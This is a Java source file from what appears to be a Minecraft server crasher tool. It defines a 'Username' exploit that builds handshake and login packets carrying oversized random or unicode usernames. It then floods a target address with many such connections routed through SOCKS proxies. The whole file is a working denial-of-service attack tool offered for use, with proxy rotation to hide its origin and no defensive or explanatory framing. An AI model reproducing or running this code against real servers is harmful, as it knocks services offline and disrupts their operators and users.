package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.helper.StringHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Username",
    description = "Username overflow idk xd",
    usage = "exploit username <address> <amount> <unicode: true/false> <nick length>"
)
public class Username extends Exploit {

  private final List<Packet[]> packets = new ArrayList<>();

  public Username() {
    super(
        new Argument("address", 0, McAddress.class),
        new Argument("amount", 1, Integer.class),
        new Argument("unicode", 2, Boolean.class),
        new Argument("nick length", 3, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    McAddress address = (McAddress) args[0];
    int amount = (int) args[1];

    index.set(0);
    preGenerate((boolean)args[2], (int)args[3], amount, address.getIp(), address.getPort());

    Optimizer.startOptimizing(Username.class);
    Optimizer.setStopAction(packets::clear);
    for (int i = 0; i < amount; i++) {
      int finalI = i;
      Optimizer.post(() -> {
        try {
          Proxy proxy = ProxyHelper.getSocks();
          Socket socket = ProxyHelper.createSocket(proxy);
          if (socket == null)
            throw new ThreadDeath();

          socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
          NetOut netOut = new NetOut(socket.getOutputStream());
          for (Packet packet : packets.get(finalI)) {
            packet.send(netOut);
          }

          Optimizer.update();
          System.out.println(String.format(" %s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
        } catch (Exception ignored) {
        }
      });
    }
  }

  private void preGenerate(boolean unicode, int length, int amount, String ip, int port) {
    if (length > Short.MAX_VALUE)
      length = Short.MAX_VALUE;

    System.out.println("Pre generating packets");
    for (int i = 0; i < amount; i++) {
      packets.add(new Packet[]{
          PacketHelper.createHandshake(47, ip, (short) port, 2),
          PacketHelper.createLoginStart(unicode ? StringHelper.getRandomUTF(length) : StringHelper.getRandomString(length))
      });
    }
    System.out.println("Generated packets");
  }
}